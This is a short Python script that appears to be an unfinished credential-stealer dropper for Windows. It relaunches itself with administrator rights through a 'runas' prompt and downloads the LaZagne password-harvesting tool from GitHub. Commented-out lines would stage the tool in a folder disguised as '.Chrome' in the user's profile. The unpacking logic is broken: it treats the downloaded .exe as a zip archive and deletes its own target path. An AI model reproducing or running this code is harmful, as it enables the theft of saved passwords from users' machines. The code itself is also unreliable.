import ctypes
import sys
import zipfile
import wget
from time import sleep
from os import getlogin, mkdir, remove
from os.path import exists


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def fileDownloader(defaultPath):
    laZagneURL = 'https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe'

    wget.download(url=laZagneURL, out=defaultPath)

    zip_ref = zipfile.ZipFile(defaultPath, 'r')

    zip_ref.extractall(defaultPath)
    zip_ref.close()
    remove(defaultPath)


if is_admin():
    print('isAdmin')
else:
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1)

# if is_admin():
# username = getlogin()
# defaultPath = f'C:\\Users\\{username}\\.Chrome'
# if not exists(defaultPath):
#   mkdir(defaultPath)
#   fileDownloader(defaultPath)
# else:
#
